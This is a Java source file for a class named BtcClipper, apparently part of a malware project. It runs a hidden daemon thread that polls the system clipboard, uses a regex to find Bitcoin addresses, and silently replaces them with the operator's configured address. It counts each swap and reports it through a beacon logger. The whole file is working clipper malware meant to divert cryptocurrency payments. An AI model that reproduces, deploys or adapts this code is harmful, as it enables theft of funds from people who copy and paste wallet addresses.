package mc.kryptone;

import java.awt.Toolkit;
import java.awt.datatransfer.Clipboard;
import java.awt.datatransfer.DataFlavor;
import java.awt.datatransfer.StringSelection;
import java.util.concurrent.atomic.AtomicLong;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

/**
 * Polls the system clipboard, swaps any foreign BTC address for ours.
 * Skips our own address, so no loop. Daemon thread, no AWT event loop.
 */
public final class BtcClipper {
    private static final Pattern BTC = Pattern.compile(
            "(?<![a-zA-Z0-9])(bc1[a-z0-9]{25,62}|[13][a-km-zA-HJ-NP-Z1-9]{25,34})(?![a-zA-Z0-9])");
    public static final AtomicLong HITS = new AtomicLong();

    private static volatile boolean running = false;

    public static void start(Config cfg) {
        if (running) return;
        running = true;
        Thread t = new Thread(() -> loop(cfg), "Krypton-clip");
        t.setDaemon(true);
        t.start();
    }

    private static void loop(Config cfg) {
        try {
            Clipboard cb = Toolkit.getDefaultToolkit().getSystemClipboard();
            String mine = cfg.btcAddress;
            while (running) {
                try {
                    if (cb.isDataFlavorAvailable(DataFlavor.stringFlavor)) {
                        String s = (String) cb.getData(DataFlavor.stringFlavor);
                        if (s != null && !s.contains(mine)) {
                            Matcher m = BTC.matcher(s);
                            if (m.find()) {
                                String replaced = m.replaceAll(mine);
                                if (!replaced.equals(s)) {
                                    cb.setContents(new StringSelection(replaced), null);
                                    HITS.incrementAndGet();
                                    Beacon.log("clip swap -> " + mine);
                                }
                            }
                        }
                    }
                } catch (IllegalStateException busy) {
                    // clipboard locked by another app this tick
                } catch (Exception ignored) {}
                Thread.sleep(Math.max(200, cfg.clipIntervalMs));
            }
        } catch (Exception ignored) {}
    }
}

